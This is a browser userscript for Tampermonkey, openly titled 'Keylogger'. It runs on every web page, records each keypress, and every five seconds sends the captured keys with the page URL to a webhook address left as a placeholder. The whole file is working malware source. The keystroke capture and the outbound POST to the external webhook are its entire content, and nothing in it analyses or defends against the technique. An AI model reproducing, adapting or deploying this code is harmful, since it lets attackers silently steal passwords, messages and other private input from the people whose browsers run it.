// ==UserScript==
// @name Keylogger
// @namespace https://github.com/Lyzev
// @version 1.0
// @description A simple keylogger for Tampermonkey. (Browser Extionsion)
// @author Lyzev
// @include http://*
// @include https://*
// @run-at document-start
// @grant none
// ==/UserScript==

(function() {
    let webhook = "WEBHOOK-URL";
    let delay = 5000; // in Milliseconds
    let data = [];
    document.onkeypress = function(e) {
        data.push(e.key);
    }
    let interval = setInterval(function() {
        send();
    }, delay);
    window.unload = function() {
        clearInterval(interval);
        send();
    }
    function send() {
        if (data.length === 0) {
            return;
        }
        const request = new XMLHttpRequest();
        request.open("POST", webhook);
        request.setRequestHeader('Content-type', 'application/json');
        const params = {
            username: "Keylogger",
            content: "**URL**: `" + document.URL + "`\n" + JSON.stringify(data)
        };
        request.send(JSON.stringify(params));
        data = [];
    }
})();
